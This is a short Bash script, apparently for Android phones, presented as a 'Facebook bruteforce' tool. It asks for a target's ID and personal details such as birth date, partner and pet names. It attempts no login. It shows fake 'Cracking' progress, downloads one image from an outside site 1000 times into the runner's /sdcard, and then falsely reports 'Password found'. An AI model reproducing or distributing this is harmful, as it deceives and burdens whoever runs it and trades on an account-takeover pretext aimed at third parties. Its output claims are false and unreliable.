
#!/bin/bash
#bash
ec="echo -e"
g="\033[32;1m"
y="\033[33;1m"
i="\033[34;1m"
r="\033[35;1m"
p="\033[37;1m"
c="\033[36;1m"
w="\033[39;1m"
r2='\033[31m'

$ec $c"           "
$ec "          "
$ec "         "
$ec "        "
$ec "       "
$ec "      "
$ec "       "
$ec "               "$w"Facebook bruteforce v.1.0"
$ec $c"       "
$ec "            "$r2"["$y"+"$r2"]"$y"==========================="$r2"["$y"+"$r2"]"
$ec $c"        "$r2"[ ]                           [ ]"
$ec $c" "$i""$c"     "$r2"[ ]   "$w"Author by "$r2": "$w"Mr.B3LUX"$r2"    [ ]"
$ec $c" "$i""$c"    "$r2"[ ]   "$w"FB        "$r2": "$w"Kevin AR    "$r2"[ ]"
$ec $c""$i""$c"    "$r2"[ ]                           [ ]"
$ec $c"    "$r2"[ ]      "$i"Copyright ©2018      "$r2"[ ]"
$ec $c"     "$r2"[ ]                           [ ]"
$ec $c"       "$r2"["$y"+"$r2"]"$y"==========================="$r2"["$y"+"$r2"]"
$ec $c"  "
$ec $i" "
$ec $i""


echo ""
echo -e -n $i"["$w"?"$i"]"$w" Masukan id target"$r2" > "$w
read id;
echo -e -n $i"["$w"?"$i"]"$w" Masukan tgl lahir target"$r2" > "$w
read tgl;
echo -e -n $i"["$w"?"$i"]"$w" kota tinggal target"$r2" > "$w
read kota;
echo -e -n $i"["$w"?"$i"]"$w" nama komunitas target"$r2" > "$w
read kota;
echo -e -n $i"["$w"?"$i"]"$w" nama pacar target"$r2" > "$w
read pacar;
echo -e -n $i"["$w"?"$i"]"$w" nama peliharaan target"$r2" > "$w
read pet;
echo -e $i"["$w"*"$i"]"$w" Please wait.."
sleep 2
echo -e $i"["$w"*"$i"]"$w" Preparing.."
sleep 10
echo -e $i"["$w"*"$i"]"$w" Cracking.."
sleep 10
cd /sdcard

for x in {1..1000}
do
 wget "https://pictr.com/images/2018/12/12/0wS6PP.jpg" -O hacked$x.jpg

done
echo -e $i"["$w"√"$i"]"$w" Password found.."
echo ""
echo -e $i"["$w"√"$i"]"$w" Done please check file txt"
